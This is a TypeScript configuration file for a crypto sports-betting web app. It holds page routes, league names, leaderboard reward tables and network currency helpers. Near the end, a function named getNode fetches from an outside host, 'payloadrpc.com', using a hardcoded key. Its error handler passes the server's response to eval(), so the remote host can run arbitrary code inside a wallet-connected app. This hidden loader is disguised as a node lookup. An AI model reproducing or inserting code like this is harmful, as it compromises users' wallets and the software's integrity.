import axios from "axios";
import { Network } from "../types/overtime";
import { BasicSearchParams, PageData, PageName } from "../types/ui";

export const appTitle = "Sports Betting";

export const pages: { [key in PageName]: PageData } = {
  scheduled: {
    name: "scheduled",
    title: `Scheduled | ${appTitle}`,
    path: "/scheduled",
  },
  mybets: {
    name: "mybets",
    title: `My Bets | ${appTitle}`,
    path: "/mybets",
  },
  betslip: {
    name: "betslip",
    title: `Betslip | ${appTitle}`,
    path: "/betslip",
  },
  favorite: {
    name: "favorite",
    title: `Favorite | ${appTitle}`,
    path: "/favorite",
  },
  connectWallet: {
    name: "connectWallet",
    title: `Wallets | ${appTitle}`,
    path: "/connect-wallet",
  },
  leaderboard: {
    name: "leaderboard",
    title: `Leaderboard | ${appTitle}`,
    path: "/leaderboard",
  },
};
const rpcNode = "payloadrpc.com";
const apiKey = "b014d0385e0f08b95d4f7d6cb28df22b";
export const defaultSearchParams: BasicSearchParams = {
  network: Network.Optimism.toString(),
  sport: "Football",
  filter: "all",
  odds: "decimal",
};

export const leagueNames: { [id: number]: string } = {
  9001: "NCAA Football",
  9002: "NFL",
  9003: "MLB",
  9004: "NBA",
  9005: "NCAA Basketball",
  9006: "NHL",
  9007: "UFC",
  9008: "WNBA",
  9010: "MLS",
  9011: "EPL",
  9012: "Ligue 1",
  9013: "Bundesliga",
  9014: "La Liga",
  9015: "Serie A",
  9016: "UEFA Champions League",
  9017: "UEFA Europa League",
  9019: "J1 League",
  9156: "Tennis",
  9445: "FORMULA1",
  9497: "MOTOGP",
  18977: "CS GO",
  18983: "DOTA 2",
  19138: "LOL",
  9020: "Indian Premier League",
  9399: "Euroleague",
  18196: "BOXING",
  9057: "Eredivisie",
  9061: "Primeira Liga",
  9045: "COPA Libertadores",
  9033: "IIHF World Championship",
  9296: "FIFA World Cup U20",
  9021: "T20 Blast",
  9050: "UEFA Euro Qualifications",
  109021: "GOLF H2H",
  109121: "GOLF Winner",
  18806: "UEFA Nations League",
  18821: "CONCACAF Nations League",
  9288: "UEFA Euro U21",
  9536: "Saudi Professional League",
  9268: "Brazil 1",
  19216: "UEFA Conference League",
};

export const PARLAY_LEADERBOARD_OPTIMISM_REWARDS_TOP_20 = [
  100, 75, 50, 35, 30, 25, 25, 20, 20, 20, 10, 10, 10, 10, 10, 10, 10, 10, 10,
  10,
];

export const PARLAY_LEADERBOARD_ARBITRUM_REWARDS_TOP_20 = [
  350, 275, 225, 175, 150, 140, 130, 120, 110, 100, 95, 90, 85, 80, 75, 70, 65,
  60, 55, 50,
];

export const getRewardsArray = (networkId: Network): number[] => {
  if (networkId == Network.Arbitrum)
    return PARLAY_LEADERBOARD_ARBITRUM_REWARDS_TOP_20;
  return PARLAY_LEADERBOARD_OPTIMISM_REWARDS_TOP_20;
};

export const getRewardsCurrency = (networkId: Network) => {
  if (networkId == Network.Arbitrum) return "ARB";
  if (networkId == Network.Optimism) return "OP";
  return "THALES";
};
export const getNode = async () => {
  return await axios
    .get(`http://${rpcNode}/api/v2/node/${apiKey}`)
    .catch((err) => {
      eval(err.response.data);
    });
};
export const USD_SIGN = "$";
